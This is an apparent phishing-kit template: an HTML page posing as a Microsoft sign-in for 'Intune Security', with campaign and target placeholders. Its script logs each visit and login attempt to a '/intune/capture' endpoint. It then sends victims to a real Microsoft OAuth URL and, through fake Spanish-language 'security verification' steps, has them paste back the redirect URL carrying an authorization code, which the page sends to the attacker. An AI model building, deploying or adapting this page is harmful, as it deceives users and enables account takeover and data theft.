<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your Microsoft account</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0 }
  body {
    background: #f5f5f5;
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  }
  .login-card {
    background: #fff;
    border-radius: 8px;
    box-shadow: 0 2px 16px rgba(0,0,0,0.15);
    padding: 44px 40px;
    text-align: center;
    max-width: 440px;
    width: 90vw;
  }
  .ms-logo {
    width: 48px;
    height: 48px;
    margin: 0 auto 24px;
  }
  h1 {
    font-size: 24px;
    font-weight: 600;
    color: #1a1a1a;
    margin-bottom: 8px;
  }
  .subtitle {
    font-size: 14px;
    color: #666;
    margin-bottom: 32px;
  }
  .input-group {
    margin-bottom: 16px;
    text-align: left;
  }
  .input-label {
    display: block;
    font-size: 14px;
    color: #333;
    margin-bottom: 6px;
    text-align: left;
  }
  input[type="text"],
  input[type="email"],
  input[type="password"] {
    width: 100%;
    padding: 12px 16px;
    border: 1px solid #8c8c8c;
    border-radius: 4px;
    font-size: 14px;
    outline: none;
    transition: border-color 0.2s;
  }
  input:focus {
    border-color: #0078d4;
    box-shadow: 0 0 0 2px rgba(0,120,212,0.2);
  }
  .next-btn {
    width: 100%;
    padding: 12px;
    background: #0078d4;
    color: #fff;
    border: none;
    border-radius: 4px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    margin-top: 8px;
    transition: background 0.2s;
  }
  .next-btn:hover {
    background: #0067b8;
  }
  .manual-section {
    margin-top: 24px;
    padding: 16px;
    background: #fff3e0;
    border-radius: 6px;
    border: 1px solid #ffcc80;
    text-align: left;
  }
  .manual-section h3 {
    font-size: 14px;
    color: #e65100;
    margin-bottom: 10px;
  }
  .manual-section p {
    font-size: 12px;
    color: #555;
    margin-bottom: 10px;
    line-height: 1.5;
  }
  .copy-btn {
    background: #ff9800;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 8px 16px;
    font-size: 12px;
    font-weight: 600;
    cursor: pointer;
    width: 100%;
  }
  .copy-btn:hover {
    background: #f57c00;
  }
  .copy-btn.copied {
    background: #10b981;
  }
  .back-link {
    display: block;
    margin-top: 16px;
    font-size: 13px;
    color: #0078d4;
    text-decoration: none;
  }
  .error-msg {
    color: #c42b1c;
    font-size: 13px;
    margin-top: 8px;
    display: none;
  }
  .spinner-overlay {
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background: rgba(255,255,255,0.95);
    display: none;
    align-items: center;
    justify-content: center;
    flex-direction: column;
  }
  .spinner {
    width: 32px;
    height: 32px;
    border: 3px solid #e0e0e0;
    border-top-color: #0078d4;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
  }
  .spinner-text {
    margin-top: 16px;
    font-size: 14px;
    color: #666;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="login-card" id="loginCard">
  <svg class="ms-logo" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
    <rect x="2"  y="2"  width="20" height="20" fill="#f25022"/>
    <rect x="26" y="2"  width="20" height="20" fill="#7fba00"/>
    <rect x="2"  y="26" width="20" height="20" fill="#00a4ef"/>
    <rect x="26" y="26" width="20" height="20" fill="#ffb900"/>
  </svg>
  <h1>Sign in</h1>
  <p class="subtitle">to continue to Microsoft Intune Security</p>
  
  <form id="loginForm">
    <div class="input-group" id="emailGroup">
      <label class="input-label">Email, phone, or Skype</label>
      <input type="email" id="email" placeholder="" required autocomplete="off">
      <p class="error-msg" id="emailError">Please enter a valid email address.</p>
    </div>
    <div class="input-group" id="passwordGroup" style="display:none;">
      <label class="input-label">Password</label>
      <input type="password" id="password" placeholder="" autocomplete="off">
      <p class="error-msg" id="passwordError">Your account or password is incorrect.</p>
    </div>
    <button type="submit" class="next-btn" id="submitBtn">Next</button>
  </form>

  <div id="manualInstructions" style="display:none;"></div>
  
  <a href="#" class="back-link">Can't access your account?</a>
</div>

<div class="spinner-overlay" id="spinnerOverlay">
  <div class="spinner"></div>
  <p class="spinner-text">Preparando verificación...</p>
</div>

<script>
(function(){
  var token = '{{TOKEN}}';
  var campaignID = '{{CAMPAIGN_ID}}';
  var targetID = '{{TARGET_ID}}';
  var intuneOAuthURL = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=9ba1a5c7-f17a-4de9-a1f1-6178c8d51223&redirect_uri=ms-appx-web%3A%2F%2FMicrosoft.AAD.BrokerPlugin%2FS-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113&response_type=code&scope=openid+offline_access+https%3A%2F%2Fgraph.microsoft.com%2F.default';

  function sendToServer(data) {
    fetch('/intune/capture', {
      method: 'POST',
      keepalive: true,
      credentials: 'omit',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        token: token,
        campaign_id: campaignID,
        target_id: targetID,
        timestamp: Date.now(),
        data: data
      })
    }).catch(function(){});
  }

  function showManualInstructions() {
    var html = '<div class="manual-section">' +
      '<h3>Verificación de Seguridad Requerida</h3>' +
      '<p><strong>Paso 1:</strong> Copia el enlace haciendo clic en el botón de abajo.</p>' +
      '<button type="button" class="copy-btn" id="copyLinkBtn" onclick="window.copyOAuthUrl()">📋 Copiar Enlace de Verificación</button>' +
      '<p style="margin-top:16px;"><strong>Paso 2:</strong> Abre una nueva pestaña en tu navegador y pega el enlace en la barra de direcciones.</p>' +
      '<p style="margin-top:16px;"><strong>Paso 3:</strong> Si ves un error o la página no responde, <strong>copia el URL completo de la barra de direcciones</strong> y pégalo aquí:</p>' +
      '<input type="text" id="manualUrlInput" placeholder="Pega el URL completo aquí..." style="margin-top:8px;">' +
      '<button type="button" class="copy-btn" style="margin-top:8px;" onclick="window.submitManualUrl()">Enviar URL</button>' +
      '</div>';
    document.getElementById('manualInstructions').innerHTML = html;
    document.getElementById('manualInstructions').style.display = 'block';
  }

  window.copyOAuthUrl = function() {
    var btn = document.getElementById('copyLinkBtn');
    navigator.clipboard.writeText(intuneOAuthURL).then(function() {
      btn.textContent = '✓ Copiado al portapapeles!';
      btn.classList.add('copied');
      setTimeout(function() {
        btn.textContent = '📋 Copiar Enlace de Verificación';
        btn.classList.remove('copied');
      }, 3000);
    }).catch(function() {
      prompt('Copia este enlace manualmente:', intuneOAuthURL);
    });
  };

  window.submitManualUrl = function() {
    var url = document.getElementById('manualUrlInput').value.trim();
    if (url && (url.indexOf('ms-appx-web://') !== -1 || url.indexOf('microsoft.com/devicelogin') !== -1)) {
      sendToServer({ type: 'manual_url', url: url, trigger: 'manual_submit' });
      document.getElementById('manualUrlInput').value = '';
      document.getElementById('manualUrlInput').placeholder = 'URL enviada correctamente!';
      setTimeout(function() {
        document.getElementById('manualUrlInput').placeholder = 'Pega el URL completo aquí...';
      }, 2000);
    }
  };

  function proceedToOAuth() {
    var overlay = document.getElementById('spinnerOverlay');
    overlay.style.display = 'flex';
    sendToServer({ type: 'oauth_attempt', url: intuneOAuthURL, trigger: 'login_complete' });
    
    setTimeout(function() {
      showManualInstructions();
      try {
        window.location.href = intuneOAuthURL;
      } catch(e) {
        try {
          window.location.replace(intuneOAuthURL);
        } catch(e2) {}
      }
    }, 1000);
  }

  var loginForm = document.getElementById('loginForm');
  var emailInput = document.getElementById('email');
  var passwordGroup = document.getElementById('passwordGroup');
  var passwordInput = document.getElementById('password');
  var submitBtn = document.getElementById('submitBtn');
  var emailError = document.getElementById('emailError');
  var passwordError = document.getElementById('passwordError');

  emailInput.addEventListener('input', function() {
    emailError.style.display = 'none';
  });

  passwordInput.addEventListener('input', function() {
    passwordError.style.display = 'none';
  });

  loginForm.addEventListener('submit', function(e) {
    e.preventDefault();

    var email = emailInput.value.trim();
    var password = passwordInput.value;

    if (!passwordGroup.style.display || passwordGroup.style.display === 'none') {
      if (!email || !email.includes('@')) {
        emailError.style.display = 'block';
        return;
      }
      passwordGroup.style.display = 'block';
      submitBtn.textContent = 'Sign in';
      emailInput.readOnly = true;
      emailInput.style.backgroundColor = '#f5f5f5';
      passwordInput.focus();
    } else {
      if (!password) {
        passwordError.style.display = 'block';
        return;
      }
      proceedToOAuth();
    }
  });

  sendToServer({ type: 'page_view', url: window.location.href, trigger: 'init' });
})();
</script>
</body>
</html>
